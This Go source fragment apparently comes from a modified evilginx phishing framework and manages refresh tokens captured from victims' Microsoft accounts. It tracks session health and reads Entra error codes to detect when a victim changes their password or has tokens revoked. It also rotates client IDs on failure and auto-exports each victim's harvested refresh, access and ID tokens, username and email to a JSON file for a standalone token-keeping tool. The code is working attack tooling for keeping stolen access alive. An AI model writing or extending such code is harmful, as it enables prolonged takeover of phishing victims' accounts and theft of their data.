	h := &SessionHealth{
		SessionID:        s.SessionId,
		DBId:             s.Id,
		Username:         s.Username,
		Status:           "new",
		CapturedAt:       capturedAt,
		LastRefreshTime:  time.Time{},
		CurrentClientIdx: 0,
	}

	// Load persisted health data if available
	if s.Custom != nil {
		if v, ok := s.Custom["_health_failures"]; ok {
			fmt.Sscanf(v, "%d", &h.ConsecutiveFailures)
		}
		if v, ok := s.Custom["_health_total"]; ok {
			fmt.Sscanf(v, "%d", &h.TotalRefreshes)
		}
		if v, ok := s.Custom["_health_client_idx"]; ok {
			fmt.Sscanf(v, "%d", &h.CurrentClientIdx)
		}
		if v, ok := s.Custom["_health_last_error"]; ok {
			h.LastError = v
		}
	}

	m.updateHealthStatusLocked(h)
	m.health[s.SessionId] = h
	return h
}

// updateHealthStatus determines the session status based on health metrics
func (m *TokenAutoRefreshManager) updateHealthStatus(health *SessionHealth) {
	m.healthMu.Lock()
	defer m.healthMu.Unlock()
	m.updateHealthStatusLocked(health)
}

func (m *TokenAutoRefreshManager) updateHealthStatusLocked(health *SessionHealth) {
	switch {
	case health.PasswordChangeDetected:
		health.Status = "password_changed"
	case health.ConsecutiveFailures >= MAX_CONSECUTIVE_FAILURES:
		health.Status = "dead"
	case health.ConsecutiveFailures >= 3:
		health.Status = "degraded"
	case health.TotalRefreshes == 0:
		health.Status = "new"
	default:
		health.Status = "healthy"
	}
}

// calculateBackoff returns exponential backoff duration
func (m *TokenAutoRefreshManager) calculateBackoff(failures int) time.Duration {
	// Base: 2 minutes, doubles each failure beyond threshold, max 30 minutes
	backoff := time.Duration(math.Pow(2, float64(failures-MAX_CONSECUTIVE_FAILURES))) * 2 * time.Minute
	if backoff > MAX_BACKOFF_DELAY {
		backoff = MAX_BACKOFF_DELAY
	}
	return backoff
}

// persistHealthForSession saves health metadata to the database
func (m *TokenAutoRefreshManager) persistHealthForSession(sessionId string, health *SessionHealth) {
	m.db.SetSessionCustom(sessionId, "_health_failures", fmt.Sprintf("%d", health.ConsecutiveFailures))
	m.db.SetSessionCustom(sessionId, "_health_total", fmt.Sprintf("%d", health.TotalRefreshes))
	m.db.SetSessionCustom(sessionId, "_health_client_idx", fmt.Sprintf("%d", health.CurrentClientIdx))
	if health.LastError != "" {
		errTrunc := health.LastError
		if len(errTrunc) > 200 {
			errTrunc = errTrunc[:200]
		}
		m.db.SetSessionCustom(sessionId, "_health_last_error", errTrunc)
	}
}

// loadHealthFromDB preloads health data from database on startup
func (m *TokenAutoRefreshManager) loadHealthFromDB() {
	sessions, err := m.db.ListSessions()
	if err != nil {
		return
	}

	loaded := 0
	for _, s := range sessions {
		if s.Custom == nil {
			continue
		}
		if _, ok := s.Custom["dc_refresh_token"]; !ok {
			continue
		}
		m.getOrCreateHealth(s)
		loaded++
	}
	if loaded > 0 {
		log.Info("[autorefresh] Loaded health data for %d sessions", loaded)
	}
}

// saveHealthToDB persists all health data to database (called on shutdown)
func (m *TokenAutoRefreshManager) saveHealthToDB() {
	m.healthMu.RLock()
	defer m.healthMu.RUnlock()

	for sid, h := range m.health {
		m.persistHealthForSession(sid, h)
	}
}

// isTokenRevoked checks if the error indicates the token has been revoked
// ENHANCED with comprehensive password-change and revocation detection
// (password change, admin revocation, account disabled, conditional access, etc.)
func isTokenRevoked(errMsg string) bool {
	revokeIndicators := []string{
		// Direct token revocation
		"AADSTS50173",  // Token has been revoked (most common after password change)
		"AADSTS700084", // Refresh token was revoked
		"AADSTS700082", // Expired refresh token
		"AADSTS70008",  // Refresh token has expired (after 90 days of inactivity)
		
		// Password-related errors (PRIMARY INDICATORS)
		"AADSTS50126",  // Invalid credentials - often first sign of password change
		"AADSTS50055",  // Password expired
		"AADSTS50078",  // User needs to re-authenticate (password changed)
		"AADSTS50105",  // User not assigned role
		
		// Account status errors
		"AADSTS50053",  // Account locked
		"AADSTS50057",  // Account disabled
		"AADSTS50034",  // User account does not exist
		"AADSTS700016", // Application not found (tenant changed)
		
		// Conditional Access / Security
		"AADSTS50076",  // Need MFA (conditional access changed)
		"AADSTS50079",  // MFA enrollment required
		"AADSTS50158",  // External security challenge
		"AADSTS53003",  // Blocked by Conditional Access
		"AADSTS53000",  // Device compliance required
		
		// Generic grant errors that often indicate password change
		"invalid_grant",
		"unauthorized_client",
		"interaction_required",
	}
	for _, indicator := range revokeIndicators {
		if strings.Contains(errMsg, indicator) {
			return true
		}
	}
	return false
}

// isPasswordChangeError specifically detects password change scenarios
func isPasswordChangeError(errMsg string) bool {
	passwordChangeIndicators := []string{
		"AADSTS50173", // Primary: token revoked (usually password change)
		"AADSTS50126", // Invalid credentials
		"AADSTS50055", // Password expired
		"AADSTS50078", // Re-authentication required
		"AADSTS700082", // Refresh token expired
		"invalid_grant",
	}
	for _, indicator := range passwordChangeIndicators {
		if strings.Contains(errMsg, indicator) {
			return true
		}
	}
	return false
}

// isRetryableError checks if the error is transient and worth retrying with another client
func isRetryableError(errMsg string) bool {
	retryIndicators := []string{
		"AADSTS50196",    // Server busy
		"AADSTS700016",   // Application not found (wrong client ID)
		"AADSTS90024",    // Request timed out
		"AADSTS90033",    // Database error
		"429",            // Rate limited
		"500",            // Server error
		"502",            // Bad gateway
		"503",            // Service unavailable
		"504",            // Gateway timeout
		"request failed", // Network error
		"timeout",
		"connection reset",
		"EOF",
	}
	for _, indicator := range retryIndicators {
		if strings.Contains(errMsg, indicator) {
			return true
		}
	}
	return false
}

// maskToken returns a masked version of the token for logging
func maskToken(token string) string {
	if len(token) <= 20 {
		return "***"
	}
	return token[:8] + "..." + token[len(token)-8:]
}

// ============================================================================
// OFFLINE TOKEN EXPORT — Portable JSON for standalone token_keeper
// ============================================================================

// OfflineTokenEntry is the portable format for a single account
type OfflineTokenEntry struct {
	SessionID    string    `json:"session_id"`
	Username     string    `json:"username"`
	Email        string    `json:"email,omitempty"`
	RefreshToken string    `json:"refresh_token"`
	AccessToken  string    `json:"access_token,omitempty"`
	IDToken      string    `json:"id_token,omitempty"`
	Scope        string    `json:"scope,omitempty"`
	ClientName   string    `json:"client_name,omitempty"`
	Phishlet     string    `json:"phishlet,omitempty"`
	CapturedAt   time.Time `json:"captured_at"`
	LastRefresh  time.Time `json:"last_refresh"`
	RefreshCount int       `json:"refresh_count"`
	Status       string    `json:"status"`
	LastError    string    `json:"last_error,omitempty"`
	ClientIdx    int       `json:"client_idx"`
}

// OfflineTokenStore is the portable JSON file format
type OfflineTokenStore struct {
	Version    string              `json:"version"`
	ExportedAt time.Time           `json:"exported_at"`
	UpdatedAt  time.Time           `json:"updated_at"`
	Source     string              `json:"source,omitempty"`
	Tokens     []*OfflineTokenEntry `json:"tokens"`
}

// ExportTokensJSON exports all sessions with refresh tokens to a portable JSON file
// that can be used by the standalone token_keeper binary
func (m *TokenAutoRefreshManager) ExportTokensJSON(outputPath string) (int, error) {
	sessions, err := m.db.ListSessions()
	if err != nil {
		return 0, fmt.Errorf("failed to list sessions: %v", err)
	}

	hostname, _ := os.Hostname()
	store := &OfflineTokenStore{
		Version:    "1.0.0",
		ExportedAt: time.Now(),
		UpdatedAt:  time.Now(),
		Source:     hostname,
		Tokens:     []*OfflineTokenEntry{},
	}

	for _, s := range sessions {
		if s.Custom == nil {
			continue
		}
		rt, hasRT := s.Custom["dc_refresh_token"]
		if !hasRT || rt == "" {
			continue
		}

		entry := &OfflineTokenEntry{
			SessionID:    s.SessionId,
			Username:     s.Username,
			Email:        s.Custom["dc_user_email"],
			RefreshToken: rt,
			AccessToken:  s.Custom["dc_access_token"],
			IDToken:      s.Custom["dc_id_token"],
			Scope:        s.Custom["dc_scope"],
			ClientName:   s.Custom["dc_client"],
			Phishlet:     s.Phishlet,
			CapturedAt:   time.Unix(s.CreateTime, 0),
			Status:       "alive",
		}

		// Include health data if available
		m.healthMu.RLock()
		if h, ok := m.health[s.SessionId]; ok {
			entry.LastRefresh = h.LastRefreshTime
			entry.RefreshCount = h.TotalRefreshes
			entry.ClientIdx = h.CurrentClientIdx
			if h.Status == "dead" {
				entry.Status = "dead"
			}
			entry.LastError = h.LastError
		}
		m.healthMu.RUnlock()

		store.Tokens = append(store.Tokens, entry)
	}

	if len(store.Tokens) == 0 {
		return 0, fmt.Errorf("no sessions with refresh tokens found")
	}

	data, err := json.MarshalIndent(store, "", "  ")
	if err != nil {
		return 0, fmt.Errorf("failed to marshal: %v", err)
	}

	if err := os.WriteFile(outputPath, data, 0600); err != nil {
		return 0, fmt.Errorf("failed to write file: %v", err)
	}

	return len(store.Tokens), nil
}

// ImportTokensJSON imports refreshed tokens from a token_keeper JSON file back
// into the evilginx database, updating refresh tokens that may have been rotated
func (m *TokenAutoRefreshManager) ImportTokensJSON(inputPath string) (int, error) {
	data, err := os.ReadFile(inputPath)
	if err != nil {
		return 0, fmt.Errorf("failed to read file: %v", err)
	}

	store := &OfflineTokenStore{}
	if err := json.Unmarshal(data, store); err != nil {
		return 0, fmt.Errorf("failed to parse JSON: %v", err)
	}

	updated := 0
	for _, entry := range store.Tokens {
		if entry.SessionID == "" || entry.RefreshToken == "" || entry.Status == "dead" {
			continue
		}

		// Update refresh token in database
		if err := m.db.SetSessionCustom(entry.SessionID, "dc_refresh_token", entry.RefreshToken); err != nil {
			log.Warning("[autorefresh] Failed to import token for %s: %v", entry.Username, err)
			continue
		}

		// Also update access token if available
		if entry.AccessToken != "" {
			m.db.SetSessionCustom(entry.SessionID, "dc_access_token", entry.AccessToken)
		}

		updated++
		log.Info("[autorefresh] Imported refreshed token for %s (refreshed %d times)", entry.Username, entry.RefreshCount)
	}

	return updated, nil
}

// AutoExportSession exports a single session's tokens to the persistent export file.
// Called automatically on capture and after each successful refresh.
func (m *TokenAutoRefreshManager) AutoExportSession(s *database.Session, exportDir string) {
	if s.Custom == nil {
		return
	}
	rt, hasRT := s.Custom["dc_refresh_token"]
	if !hasRT || rt == "" {
		return
	}

	exportPath := filepath.Join(exportDir, "tokens_export.json")

	// Load existing store or create new one
	store := &OfflineTokenStore{
		Version:    "1.0.0",
		ExportedAt: time.Now(),
		UpdatedAt:  time.Now(),
		Tokens:     []*OfflineTokenEntry{},
	}

	if existingData, err := os.ReadFile(exportPath); err == nil {
		json.Unmarshal(existingData, store)
	}

	hostname, _ := os.Hostname()
	store.Source = hostname
	store.UpdatedAt = time.Now()

	// Find or create entry for this session
	var entry *OfflineTokenEntry
	for _, e := range store.Tokens {
		if e.SessionID == s.SessionId {
			entry = e
			break
		}
	}

	if entry == nil {
		entry = &OfflineTokenEntry{
			SessionID:  s.SessionId,
			CapturedAt: time.Unix(s.CreateTime, 0),
			Status:     "alive",
		}
		store.Tokens = append(store.Tokens, entry)
	}

	// Update fields
	entry.Username = s.Username
	entry.Email = s.Custom["dc_user_email"]
	entry.RefreshToken = rt
	entry.AccessToken = s.Custom["dc_access_token"]
	entry.IDToken = s.Custom["dc_id_token"]
	entry.Scope = s.Custom["dc_scope"]
	entry.ClientName = s.Custom["dc_client"]
	entry.Phishlet = s.Phishlet
	entry.LastRefresh = time.Now()

	data, err := json.MarshalIndent(store, "", "  ")
	if err != nil {
		log.Warning("[autorefresh] Auto-export marshal failed: %v", err)
		return
	}

	if err := os.WriteFile(exportPath, data, 0600); err != nil {
		log.Warning("[autorefresh] Auto-export write failed: %v", err)
		return
	}

	log.Info("[autorefresh] Auto-exported token for %s to %s", s.Username, exportPath)
}
